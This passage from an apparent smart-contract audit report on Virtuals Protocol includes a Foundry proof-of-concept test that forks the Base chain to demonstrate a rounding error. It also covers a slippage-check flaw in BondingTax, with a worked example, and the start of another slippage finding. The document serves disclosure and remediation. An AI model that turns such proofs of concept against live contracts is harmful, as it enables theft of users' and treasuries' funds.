<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_ticker</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint8</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">cores</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">desc</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">img</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1">[</span><span class="mtk7">4</span><span class="mtk1">] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">urls</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">purchaseAmount</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">router</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">buy</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenAddress</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">payable</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">BondingRoundingPOC</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IERC20</span><span class="mtk1"> </span><span class="mtk12">virtualToken</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk7">0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">bridge</span><span class="mtk1"> = </span><span class="mtk7">0x4200000000000000000000000000000000000010</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IBonding</span><span class="mtk1"> </span><span class="mtk12">bonding</span><span class="mtk1"> = </span><span class="mtk11">IBonding</span><span class="mtk1">(</span><span class="mtk7">0xF66DeA7b3e897cD44A5a231c61B6B4423d613259</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">BASE_RPC_URL</span><span class="mtk1"> = </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">envString</span><span class="mtk1">(</span><span class="mtk8">"BASE_RPC_URL"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">alice</span><span class="mtk1"> = </span><span class="mtk11">makeAddr</span><span class="mtk1">(</span><span class="mtk8">"alice"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">bob</span><span class="mtk1"> = </span><span class="mtk11">makeAddr</span><span class="mtk1">(</span><span class="mtk8">"bob"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">charlie</span><span class="mtk1"> = </span><span class="mtk11">makeAddr</span><span class="mtk1">(</span><span class="mtk8">"charlie"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualAmount</span><span class="mtk1"> = </span><span class="mtk7">45000</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">forkId</span><span class="mtk1"> = </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">createFork</span><span class="mtk1">(</span><span class="mtk12">BASE_RPC_URL</span><span class="mtk1">, </span><span class="mtk7">29_519_750</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">selectFork</span><span class="mtk1">(</span><span class="mtk12">forkId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">bridge</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">virtualToken</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">alice</span><span class="mtk1">, </span><span class="mtk12">virtualAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">virtualToken</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">bob</span><span class="mtk1">, </span><span class="mtk7">.5</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_rounding_error_upon_graduate</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">alice</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">virtualToken</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">bonding</span><span class="mtk1">), </span><span class="mtk12">virtualAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1">[</span><span class="mtk7">4</span><span class="mtk1">] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">urls</span><span class="mtk1"> = [</span><span class="mtk8">"test"</span><span class="mtk1">, </span><span class="mtk8">"test"</span><span class="mtk1">, </span><span class="mtk8">"test"</span><span class="mtk1">, </span><span class="mtk8">"test"</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint8</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">cores</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">uint8</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">cores</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk7">1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">, ) = </span><span class="mtk12">bonding</span><span class="mtk1">.</span><span class="mtk11">launch</span><span class="mtk1">(</span><span class="mtk8">"test agent"</span><span class="mtk1">, </span><span class="mtk8">"TA"</span><span class="mtk1">, </span><span class="mtk12">cores</span><span class="mtk1">, </span><span class="mtk8">"test"</span><span class="mtk1">, </span><span class="mtk8">"test"</span><span class="mtk1">, </span><span class="mtk12">urls</span><span class="mtk1">, </span><span class="mtk7">45000</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">bob</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">virtualToken</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">bonding</span><span class="mtk1">.</span><span class="mtk11">router</span><span class="mtk1">(), </span><span class="mtk7">.5</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bonding</span><span class="mtk1">.</span><span class="mtk11">buy</span><span class="mtk1">(</span><span class="mtk7">.5</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">, </span><span class="mtk12">token</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">success</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">data</span><span class="mtk1">) = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">bonding</span><span class="mtk1">).</span><span class="mtk11">call</span><span class="mtk1">(</span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encodeWithSignature</span><span class="mtk1">(</span><span class="mtk8">"tokenInfo(address)"</span><span class="mtk1">, </span><span class="mtk12">token</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">success</span><span class="mtk1">, </span><span class="mtk8">"Failed to get token info"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) = </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">decode</span><span class="mtk1">(</span><span class="mtk12">data</span><span class="mtk1">, (</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"agentToken balance of pair  :"</span><span class="mtk1">, </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">agentToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"token balance of alice + bob:"</span><span class="mtk1">, </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">alice</span><span class="mtk1">) + </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">bob</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertNotEq</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">agentToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">), </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">alice</span><span class="mtk1">) + </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">bob</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-06-bondingtax-has-invalid-slippage-implementation"><a class="anchor before" aria-label="m 06 bondingtax has invalid slippage implementation permalink" href="#m-06-bondingtax-has-invalid-slippage-implementation"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-14">[M-06] <code>BondingTax</code> has invalid slippage implementation</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-631">oakcobalt</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-307">0x1982us</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-243">adam-idarrha</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-586">Damola0x</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-300">kodyvim</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-442">levi_104</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-798">Matin</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-435">slowbugmayor</a></em></p>
<p>In BondingTax.sol, <code>swapForAsset</code> will swap <code>taxTokens</code> to <code>assetToken</code> through uniswap router. </p>
<p>The issue is that the slippage calculation (<code>minOutput</code>) is invalid. Currently, <code>mintOutput</code> is a percentage that is based on <code>router.getAmountsOut(amount, path)</code>. Since <code>router.getAmountsOut(amount, path)</code> is also dynamic based on the actual uniswapV2pair spot price; this means <code>minOutput</code> will simply be a fraction of the actual swap result. The slippage check will always pass.</p>
<pre data-index="52" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">swapForAsset</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyBondingRouter</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">...       </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">|&gt;      </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amountsOut</span><span class="mtk1"> = </span><span class="mtk12">router</span><span class="mtk1">.</span><span class="mtk11">getAmountsOut</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">path</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">amountsOut</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> &gt; </span><span class="mtk7">1</span><span class="mtk1">, </span><span class="mtk8">"Failed to fetch token price"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">expectedOutput</span><span class="mtk1"> = </span><span class="mtk12">amountsOut</span><span class="mtk1">[</span><span class="mtk7">1</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">minOutput</span><span class="mtk1"> = (</span><span class="mtk12">expectedOutput</span><span class="mtk1"> * (</span><span class="mtk7">10000</span><span class="mtk1"> - </span><span class="mtk12">_slippage</span><span class="mtk1">)) / </span><span class="mtk7">10000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1"> |&gt;     </span><span class="mtk15">try</span><span class="mtk1"> </span><span class="mtk12">router</span><span class="mtk1">.</span><span class="mtk11">swapExactTokensForTokens</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">minOutput</span><span class="mtk1">, </span><span class="mtk12">path</span><span class="mtk1">, </span><span class="mtk12">treasury</span><span class="mtk1">, </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> + </span><span class="mtk7">300</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">SwapExecuted</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk7">1</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk4">true</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk7">1</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">catch</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">SwapFailed</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk4">false</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L143">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L143</a></p>
<h3 style="position:relative;" id="impact-6"><a class="anchor before" aria-label="impact 6 permalink" href="#impact-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Invalid slippage check allows any swap-out result, causing the treasury to lose the value of collected tax. Note that, even though the base chain has a low risk of front-running attack, the loss due to slippage happens naturally during normal trading activities.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-11"><a class="anchor before" aria-label="recommended mitigation steps 11 permalink" href="#recommended-mitigation-steps-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Slippage needs to be based on an expected price. Given <code>swapForAsset</code> is only intended to be invoked by BondingRouter, consider implementing a trusted on-chain oracle price reporting and basing the slippage calculation on the on-chain price.</p>
<h3 style="position:relative;" id="proof-of-concept-9"><a class="anchor before" aria-label="proof of concept 9 permalink" href="#proof-of-concept-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Suppose 10000 virtual = 1 WBTC, due to a previous trading, price drops to 10000 virtual = 0.0833 WBTC. 1% slippage based on expected price: 0.099 WBTC.</p>
<p>In <code>swapForAsset</code>:</p>
<ol>
<li>
<p>BondingTax calculates <code>minOutput</code> with 1% slippage</p>
<ul>
<li><code>minOutput = 0.0833 WBTC * (10000 - 100) / 10000 = 0.0825 WBTC</code></li>
</ul>
</li>
<li>
<p>BondingTax executes swap with these parameters:</p>
<ul>
<li>
<p><code>router.swapExactTokensForTokens(</code></p>
<pre data-index="53" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">1000 VIRTUAL,      // amountIn</span></span>
<span class="grvsc-line"><span class="grvsc-source">0.0825 WBTC,       // minOutput (1% less than minOutput)</span></span>
<span class="grvsc-line"><span class="grvsc-source">[VIRTUAL, WBTC],   // path</span></span>
<span class="grvsc-line"><span class="grvsc-source">treasury,          // recipient</span></span>
<span class="grvsc-line"><span class="grvsc-source">block.timestamp + 300  // deadline</span></span>
<span class="grvsc-line"><span class="grvsc-source">)</span></span></code></pre>
</li>
</ul>
</li>
<li>
<p>The swap executes at the worse price:</p>
<ul>
<li>Treasury receives approximately 0.0833 WBTC <code>&lt;</code> 0.099 WBTC.</li>
</ul>
</li>
</ol>
<p><code>swapForAsset</code> accepts unbounded slippage.</p>
<hr>
<h2 style="position:relative;" id="m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage"><a class="anchor before" aria-label="m 07 amountoutmin passed in as 0 in agenttoken_swaptax leads to loss of funds due to slippage permalink" href="#m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-15">[M-07] <code>amountOutMin</code> passed in as 0 in <code>AgentToken::_swapTax</code> leads to loss of funds due to slippage</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-623">YouCrossTheLineAlfie</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-733">0x60scs</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-244">adam-idarrha</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-247">anchabadze</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-574">bytesguard</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-198">classic-k</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-757">DanielTan</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-3">debo</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-9">gmh5225</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-396">gregom</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-801">harsh123</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-240">odessos42</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-796">Olugbenga</a>, <a 